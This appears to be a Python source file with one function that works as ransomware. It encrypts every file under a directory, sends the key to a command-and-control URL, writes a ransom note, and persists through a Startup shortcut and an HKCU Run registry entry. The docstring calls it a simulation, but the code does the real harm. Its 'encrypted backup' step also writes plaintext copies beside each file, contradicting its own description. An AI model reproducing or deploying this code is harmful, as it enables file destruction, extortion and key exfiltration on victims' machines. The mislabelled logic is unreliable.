import os
import base64
from cryptography.fernet import Fernet
import requests
import winreg as reg
import win32com.client

def ransomware_with_encrypted_backup(directory: str, note: str, c2_url: str) -> None:
    """
    This function simulates a ransomware attack by encrypting all files in the specified directory,
    creating encrypted backups of the files, sending the encryption key to a command and control server,
    displaying a ransom note, and ensuring persistence.

    :param directory: The path of the directory to encrypt.
    :param note: The ransom note to display to the victim.
    :param c2_url: The URL of the command and control server to send the encryption key.
    """
    key = Fernet.generate_key()
    fernet = Fernet(key)
    
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
            backup_path = file_path + '.bak'
            with open(backup_path, 'wb') as f:
                f.write(data)
    
    encoded_key = base64.b64encode(key).decode('utf-8')
    requests.post(c2_url, json={'key': encoded_key})
    
    with open(os.path.join(directory, 'README.txt'), 'w') as f:
        f.write(note)
    
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ransomware.lnk'))
    shortcut.TargetPath = os.path.abspath(__file__)
    shortcut.Save()
    
    key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(reg_key, 'Ransomware', 0, reg.REG_SZ, os.path.abspath(__file__))
    reg.CloseKey(reg_key)

